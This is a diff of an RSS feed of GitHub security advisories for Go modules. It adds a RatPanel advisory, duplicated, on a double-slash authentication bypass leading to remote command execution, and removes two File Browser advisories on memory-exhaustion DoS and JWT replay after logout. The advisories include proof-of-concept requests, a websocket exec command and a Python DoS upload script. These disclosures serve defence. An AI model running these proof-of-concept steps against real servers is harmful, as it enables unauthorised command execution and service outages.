@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2025-08-04T20:28:33.172Z</updated>
+    <updated>2025-08-04T20:47:12.877Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,138 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/tnborg/panel] RatPanel can perform remote command execution without authorization]]></title>
+        <id>https://github.com/advisories/GHSA-fm3m-jrgm-5ppg</id>
+        <link href="https://github.com/advisories/GHSA-fm3m-jrgm-5ppg"/>
+        <updated>2025-08-04T20:46:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<ul>
+<li>When an attacker obtains the backend login path of RatPanel (including but not limited to weak default paths, brute-force cracking, etc.), they can execute system commands or take over hosts managed by the panel <strong>without logging in</strong>.</li>
+<li>In addition to this <strong>remote code execution (RCE) vulnerability</strong>, the flawed code also leads to <strong>unauthorized access</strong>.</li>
+</ul>
+<h3 id="details">Details</h3>
+<p>In Go, <code>r.URL.Path</code> retrieves the part of the URL that comes after the port and before the query parameters or anchor symbols. For example, in the URL <code>http://localhost:8080/api/ws/ssh?id=1</code>, the retrieved path would be <code>/api/ws/ssh</code>.</p>
+<p>However, if the request is made to <code>http://localhost:8080//api/ws/ssh?id=1</code>, the parsed <code>r.URL.Path</code> would be <code>//api/ws/ssh</code>. </p>
+<p>RatPanel uses the <code>CleanPath</code> middleware provided by <code>github.com/go-chi/chi</code> package to clean URLs, The route path inside the chi router will be cleaned to <code>/api/ws/ssh</code>, but this middleware does not process <code>r.URL.Path</code>, so the path is still <code>//api/ws/ssh</code>.</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/788a7263-38f6-4b74-aa4a-b935239362f7"></p>
+<p>In the <code>must_login</code> middleware, RatPanel uses <code>r.URL.Path</code> to match the hard-coded prefix whitelist, because <code>/api/ws</code> does not match <code>//api/ws</code>. The <code>must_login</code> middleware will allow the request, but <code>//api/ws</code> has been cleaned to <code>/api/ws</code> in the chi router. This inconsistency leads to authentication bypass and accessing the dangerous interfaces such as <code>/api/ws/exec</code> and <code>/api/ws/ssh</code>.</p>
+<p><img alt="image-20250706193354738" src="https://github.com/user-attachments/assets/a0be46a5-9e82-4623-9b21-7247798a3c98"></p>
+<p>But there are some limitations. Before exploiting this interface, the attacker must first identify the correct backend address of ratpanel to activate session legitimacy—specifically, to ensure <code>sess.Put("verify_entrance", true)</code>. That said, accessing <code>/api/ws</code> only requires activating the session and does not require completing further authentication or login steps. Therefore, this is assessed to be a remotely exploitable command execution vulnerability with moderate severity.</p>
+<h3 id="poc">PoC</h3>
+<p>I first carried <code>session=......</code>, accessed the backend login page normally<code> (without completing the authentication process)</code>, activated the session, and then used the <a href="https://github.com/websocket-client/websocket-client/blob/master/websocket/_wsdump.py">_wsdump.py</a> script provided by the Python websocket-client library to complete the authentication and exploit the vulnerability.</p>
+<p><img alt="image-20250706202209133" src="https://github.com/user-attachments/assets/89849095-8d90-465b-8d67-91b49e61c7bf">
+<img alt="image-20250706202330056" src="https://github.com/user-attachments/assets/6188f519-13f7-4ca9-84ef-f743bda55ae2">
+<img alt="image-20250706202450433" src="https://github.com/user-attachments/assets/76e4f8f3-ad67-4295-ab83-6ec910f7449d"></p>
+<p>Because of the authorization code</p>
+<pre><code class="language-golang">// internal/http/middleware/must_login.go
+if slices.Contains(whiteList, r.URL.Path) || !strings.HasPrefix(r.URL.Path, "/api") {
+    next.ServeHTTP(w, r)
+    return
+}
+</code></pre>
+<p>This vulnerability affects the authorization mechanism across all APIs, for example</p>
+<p><img alt="image-20250706204411739" src="https://github.com/user-attachments/assets/5da63d83-2652-4275-8a80-c7878de62f5c">
+<img alt="image-20250706204429581" src="https://github.com/user-attachments/assets/d83a323a-a98e-4ec0-9480-06e0d8670513"></p>
+<p>This authentication vulnerability appears to affect versions <strong>v2.3.19 to v2.5.5</strong>.</p>
+<hr>
+<p>Data packet</p>
+<pre><code class="language-text">GET //api/...... HTTP/2
+Host: IP:PORT
+Cookie: session=XXXXXX
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/json; charset=UTF-8
+Connection: close
+
+</code></pre>
+<pre><code class="language-cmd">python _wsdump.py wss://ip:port//api/ws/exec --headers "Cookie: session=xxxxxx" -n
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Users running Ratpanel versions v2.3.19 to v2.5.5—especially those who have exposed their admin panel login URL or use weak login URL paths—are vulnerable to unauthorized access. Additionally, versions v2.5.1 to v2.5.5 are susceptible to server and hosted machine takeover.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/tnborg/panel/security/advisories/GHSA-fm3m-jrgm-5ppg">https://github.com/tnborg/panel/security/advisories/GHSA-fm3m-jrgm-5ppg</a></li>
+<li><a href="https://github.com/tnborg/panel/commit/4985eb2e1f388ecd6faf331941c13cb97368ec1d">https://github.com/tnborg/panel/commit/4985eb2e1f388ecd6faf331941c13cb97368ec1d</a></li>
+<li><a href="https://github.com/tnborg/panel/commit/91ecd04c270061429f9df5ec19cd6b96a9f595f2">https://github.com/tnborg/panel/commit/91ecd04c270061429f9df5ec19cd6b96a9f595f2</a></li>
+<li><a href="https://github.com/tnborg/panel/commit/ed5c74c7534230ba685273504af4c1e1e3598ff1">https://github.com/tnborg/panel/commit/ed5c74c7534230ba685273504af4c1e1e3598ff1</a></li>
+<li><a href="https://github.com/advisories/GHSA-fm3m-jrgm-5ppg">https://github.com/advisories/GHSA-fm3m-jrgm-5ppg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fm3m-jrgm-5ppg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-08-04T20:46:32.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/tnborg/panel] RatPanel can perform remote command execution without authorization]]></title>
+        <id>https://github.com/advisories/GHSA-fm3m-jrgm-5ppg</id>
+        <link href="https://github.com/advisories/GHSA-fm3m-jrgm-5ppg"/>
+        <updated>2025-08-04T20:46:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<ul>
+<li>When an attacker obtains the backend login path of RatPanel (including but not limited to weak default paths, brute-force cracking, etc.), they can execute system commands or take over hosts managed by the panel <strong>without logging in</strong>.</li>
+<li>In addition to this <strong>remote code execution (RCE) vulnerability</strong>, the flawed code also leads to <strong>unauthorized access</strong>.</li>
+</ul>
+<h3 id="details">Details</h3>
+<p>In Go, <code>r.URL.Path</code> retrieves the part of the URL that comes after the port and before the query parameters or anchor symbols. For example, in the URL <code>http://localhost:8080/api/ws/ssh?id=1</code>, the retrieved path would be <code>/api/ws/ssh</code>.</p>
+<p>However, if the request is made to <code>http://localhost:8080//api/ws/ssh?id=1</code>, the parsed <code>r.URL.Path</code> would be <code>//api/ws/ssh</code>. </p>
+<p>RatPanel uses the <code>CleanPath</code> middleware provided by <code>github.com/go-chi/chi</code> package to clean URLs, The route path inside the chi router will be cleaned to <code>/api/ws/ssh</code>, but this middleware does not process <code>r.URL.Path</code>, so the path is still <code>//api/ws/ssh</code>.</p>
+<p><img alt="image" src="https://github.com/user-attachments/assets/788a7263-38f6-4b74-aa4a-b935239362f7"></p>
+<p>In the <code>must_login</code> middleware, RatPanel uses <code>r.URL.Path</code> to match the hard-coded prefix whitelist, because <code>/api/ws</code> does not match <code>//api/ws</code>. The <code>must_login</code> middleware will allow the request, but <code>//api/ws</code> has been cleaned to <code>/api/ws</code> in the chi router. This inconsistency leads to authentication bypass and accessing the dangerous interfaces such as <code>/api/ws/exec</code> and <code>/api/ws/ssh</code>.</p>
+<p><img alt="image-20250706193354738" src="https://github.com/user-attachments/assets/a0be46a5-9e82-4623-9b21-7247798a3c98"></p>
+<p>But there are some limitations. Before exploiting this interface, the attacker must first identify the correct backend address of ratpanel to activate session legitimacy—specifically, to ensure <code>sess.Put("verify_entrance", true)</code>. That said, accessing <code>/api/ws</code> only requires activating the session and does not require completing further authentication or login steps. Therefore, this is assessed to be a remotely exploitable command execution vulnerability with moderate severity.</p>
+<h3 id="poc">PoC</h3>
+<p>I first carried <code>session=......</code>, accessed the backend login page normally<code> (without completing the authentication process)</code>, activated the session, and then used the <a href="https://github.com/websocket-client/websocket-client/blob/master/websocket/_wsdump.py">_wsdump.py</a> script provided by the Python websocket-client library to complete the authentication and exploit the vulnerability.</p>
+<p><img alt="image-20250706202209133" src="https://github.com/user-attachments/assets/89849095-8d90-465b-8d67-91b49e61c7bf">
+<img alt="image-20250706202330056" src="https://github.com/user-attachments/assets/6188f519-13f7-4ca9-84ef-f743bda55ae2">
+<img alt="image-20250706202450433" src="https://github.com/user-attachments/assets/76e4f8f3-ad67-4295-ab83-6ec910f7449d"></p>
+<p>Because of the authorization code</p>
+<pre><code class="language-golang">// internal/http/middleware/must_login.go
+if slices.Contains(whiteList, r.URL.Path) || !strings.HasPrefix(r.URL.Path, "/api") {
+    next.ServeHTTP(w, r)
+    return
+}
+</code></pre>
+<p>This vulnerability affects the authorization mechanism across all APIs, for example</p>
+<p><img alt="image-20250706204411739" src="https://github.com/user-attachments/assets/5da63d83-2652-4275-8a80-c7878de62f5c">
+<img alt="image-20250706204429581" src="https://github.com/user-attachments/assets/d83a323a-a98e-4ec0-9480-06e0d8670513"></p>
+<p>This authentication vulnerability appears to affect versions <strong>v2.3.19 to v2.5.5</strong>.</p>
+<hr>
+<p>Data packet</p>
+<pre><code class="language-text">GET //api/...... HTTP/2
+Host: IP:PORT
+Cookie: session=XXXXXX
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/json; charset=UTF-8
+Connection: close
+
+</code></pre>
+<pre><code class="language-cmd">python _wsdump.py wss://ip:port//api/ws/exec --headers "Cookie: session=xxxxxx" -n
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Users running Ratpanel versions v2.3.19 to v2.5.5—especially those who have exposed their admin panel login URL or use weak login URL paths—are vulnerable to unauthorized access. Additionally, versions v2.5.1 to v2.5.5 are susceptible to server and hosted machine takeover.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/tnborg/panel/security/advisories/GHSA-fm3m-jrgm-5ppg">https://github.com/tnborg/panel/security/advisories/GHSA-fm3m-jrgm-5ppg</a></li>
+<li><a href="https://github.com/tnborg/panel/commit/4985eb2e1f388ecd6faf331941c13cb97368ec1d">https://github.com/tnborg/panel/commit/4985eb2e1f388ecd6faf331941c13cb97368ec1d</a></li>
+<li><a href="https://github.com/tnborg/panel/commit/91ecd04c270061429f9df5ec19cd6b96a9f595f2">https://github.com/tnborg/panel/commit/91ecd04c270061429f9df5ec19cd6b96a9f595f2</a></li>
+<li><a href="https://github.com/tnborg/panel/commit/ed5c74c7534230ba685273504af4c1e1e3598ff1">https://github.com/tnborg/panel/commit/ed5c74c7534230ba685273504af4c1e1e3598ff1</a></li>
+<li><a href="https://github.com/advisories/GHSA-fm3m-jrgm-5ppg">https://github.com/advisories/GHSA-fm3m-jrgm-5ppg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fm3m-jrgm-5ppg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-08-04T20:46:32.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/grafana/grafana-infinity-datasource] Grafana Infinity Datasource Plugin SSRF Vulnerability]]></title>
         <id>https://github.com/advisories/GHSA-3c93-92r7-j934</id>
@@ -821,180 +953,5 @@ skip_auth_routes = ["^/public/assets$", "^/public/health$", "^/api/status$"]
         </author>
         <category label="severity" term="HIGH"/>
         <published>2025-07-24T14:19:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser's Uncontrolled Memory Consumption vulnerability can enable DoS attack due to oversized file processing]]></title>
-        <id>https://github.com/advisories/GHSA-7xqm-7738-642x</id>
-        <link href="https://github.com/advisories/GHSA-7xqm-7738-642x"/>
-        <updated>2025-07-29T23:27:21.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A Denial of Service (DoS) vulnerability exists in the file processing logic when reading a file on endpoint  <code>Filebrowser-Server-IP:PORT/files/{file-name}</code> . While the server correctly handles and stores uploaded files, it attempts to load the entire content into memory during read operations without size checks or resource limits. This allows an authenticated user to upload a large file and trigger uncontrolled memory consumption on read, potentially crashing the server and making it unresponsive.</p>
-<h3 id="details">Details</h3>
-<p>The endpoint <code> /api/resources/{file-name}</code> accepts <code>PUT</code> requests with plain text file content. Uploading an extremely large file (e.g., ~1.5 GB) succeeds without issue. However, when the server attempts to open and read this file, it performs the read operation in an unbounded or inefficient way, leading to excessive memory usage.</p>
-<p>This approach attempts to read the entire file into memory at once. For large files, this causes memory exhaustion resulting in a crash or serious performance degradation. In the filebrowser codebase, this can be due to:</p>
-<ul>
-<li>Lack of memory-safe streaming or chunked reading during file processing.</li>
-<li>Absence of validation or size limits during the read phase.</li>
-<li>Possibly synchronous or blocking file parsing without protection.</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<ol start="0">
-<li>I run the project via docker (latest version, 2.38.0) using the following command found in the documentation:</li>
-</ol>
-<pre><code>docker run \
-    -v filebrowser_data:/srv \
-    -v filebrowser_database:/database \
-    -v filebrowser_config:/config \
-    -p 8080:80 \
-    filebrowser/filebrowser```
-</code></pre>
-<ol>
-<li>First login in your filebrowser and create a simple empty file eg. name it <code>another</code></li>
-<li>We will add a large data into this file via <code>PUT</code> method on the api by running the following <code>Python</code> script (as an exploit PoC script)</li>
-</ol>
-<pre><code class="language-python">import requests
-
-url = "http://filebrowser-server-IP:8080/api/resources/another"
-auth_token = "eyJh-auth-token-goes-here"
-headers = {
-    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
-    "Accept": "*/*",
-    "Accept-Language": "en-US,en;q=0.5",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Referer": "http://filebrowser-server-IP:8080/files/another",
-    "X-Auth": auth_token,
-    "Content-Type": "text/plain;charset=UTF-8",
-    "Origin": "http://filebrowser-server-IP:8080",
-    "Connection": "close",
-    "Priority": "u=0"
-}
-
-# Generate a very large string into a file (e.g 1.6 GB)
-
-base = "testing data goes here\n"
-repeat_count = 120_000_000  
-
-data = base * repeat_count
-
-print("Sending large payload...")
-response = requests.put(url, headers=headers, data=data)
-
-# Output the response
-print(f"Status Code: {response.status_code}")
-print("Response Body:")
-print(response.text)
-</code></pre>
-<ol start="3">
-<li>After running this script, go back in your filebrowser dashboard and try to open the file <code>another</code> - try to read the content in this file. The file will open on another tab and it will hang there consuming memory and resources. The entire server will remain unresponsive until the entire file loads (takes long time)</li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>Denial of Service</p>
-<h3 id="evidence">Evidence</h3>
-<img src="https://github.com/user-attachments/assets/98af76ad-0714-40a9-a92b-b2d4a5941ab7" alt="Pasted image (4)" height="350" width="2191">
-
-
-<img src="https://github.com/user-attachments/assets/d1ba3282-6c4d-4d35-81c7-87d4e0274f85" alt="Pasted image (2)" height="1039" width="2012">
-### References
-
-<ul>
-<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-7xqm-7738-642x">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-7xqm-7738-642x</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-53893">https://nvd.nist.gov/vuln/detail/CVE-2025-53893</a></li>
-<li><a href="https://github.com/filebrowser/filebrowser/issues/5294">https://github.com/filebrowser/filebrowser/issues/5294</a></li>
-<li><a href="https://github.com/advisories/GHSA-7xqm-7738-642x">https://github.com/advisories/GHSA-7xqm-7738-642x</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7xqm-7738-642x</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-07-16T14:22:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser’s insecure JWT handling can lead to session replay attacks after logout]]></title>
-        <id>https://github.com/advisories/GHSA-7xwp-2cpp-p8r7</id>
-        <link href="https://github.com/advisories/GHSA-7xwp-2cpp-p8r7"/>
-        <updated>2025-07-29T23:17:57.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>File Browser’s authentication system issues long-lived JWT tokens that remain valid even after the user logs out. Please refer to the CWE's listed in this report for further reference and system standards. In summary, the main issue is:</p>
-<ul>
-<li>Tokens remain valid after logout (session replay attacks)</li>
-</ul>
-<p>In this report, I used docker as the documentation instruct:</p>
-<pre><code>docker run \
-    -v filebrowser_data:/srv \
-    -v filebrowser_database:/database \
-    -v filebrowser_config:/config \
-    -p 8080:80 \
-    filebrowser/filebrowser
-</code></pre>
-<h3 id="details">Details</h3>
-<p><strong>Issue: Tokens remain valid after logout (session replay attacks)</strong></p>
-<p>After logging in and receiving a JWT token, the user can explicitly "log out." However, this action does not invalidate the issued JWT. Any captured token can be replayed post-logout until it expires naturally. The backend does not track active sessions or invalidate existing tokens on logout. Login request:</p>
-<pre><code>POST /api/login HTTP/1.1
-Host: machine.local:8090
-Content-Length: 69
-
-{"username":"admin","password":"password-here","recaptcha":""}
-</code></pre>
-<p>The check found in the code <code>https://github.com/filebrowser/filebrowser/blob/master/http/auth.go</code> is not enough. There is no server-side blacklist or token invalidation on logout. Token renewal and validity only depends on expiry and user store timestamps:</p>
-<pre><code>expired := !tk.VerifyExpiresAt(time.Now().Add(time.Hour), true)
-updated := tk.IssuedAt != nil &amp;&amp; tk.IssuedAt.Unix() &lt; d.store.Users.LastUpdate(tk.User.ID)
-</code></pre>
-<h3 id="poc">PoC</h3>
-<p><strong>Issue: Tokens remain valid after logout (session replay attacks)</strong></p>
-<ul>
-<li>Login and capture the generate JWT. Eg. the http request:</li>
-</ul>
-<pre><code>POST /api/login HTTP/1.1
-Host: machine.local:8090
-Content-Length: 69
-
-{"username":"admin","password":"password-here","recaptcha":""}
-</code></pre>
-<ul>
-<li>Logout in the dashboard. And then try to use the old generated JWT to access any authenticated endpoint eg:</li>
-</ul>
-<pre><code>GET /api/resources HTTP/1.1
-Host: machine.local:8090
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
-X-Auth: Old-JWT-token-here
-Content-Length: 173
-Accept: */*
-Referer: http://machine.local:8090/files/
-Accept-Encoding: gzip, deflate, br
-Accept-Language: en-US,en;q=0.9
-Content-Length: 26
-
-Connection: keep-alive
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>A valid JWT remains active after user logout.</li>
-<li>If stolen, tokens persist access indefinitely until expiry.</li>
-<li>Violates OWASP Top 10 A2:2021 - Broken Authentication.</li>
-</ul>
-<h3 id="recommendations">Recommendations</h3>
-<ul>
-<li>Read all CWE's attached in this report</li>
-<li>Invalidate JWTs on logout via session store / token blacklist.</li>
-<li>Reduce JWT ExpiresAt where possible or use short-lived + refresh tokens.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-7xwp-2cpp-p8r7">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-7xwp-2cpp-p8r7</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-53826">https://nvd.nist.gov/vuln/detail/CVE-2025-53826</a></li>
-<li><a href="https://github.com/filebrowser/filebrowser/issues/5216">https://github.com/filebrowser/filebrowser/issues/5216</a></li>
-<li><a href="https://github.com/advisories/GHSA-7xwp-2cpp-p8r7">https://github.com/advisories/GHSA-7xwp-2cpp-p8r7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7xwp-2cpp-p8r7</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-07-16T14:09:28.000Z</published>
     </entry>
 </feed>
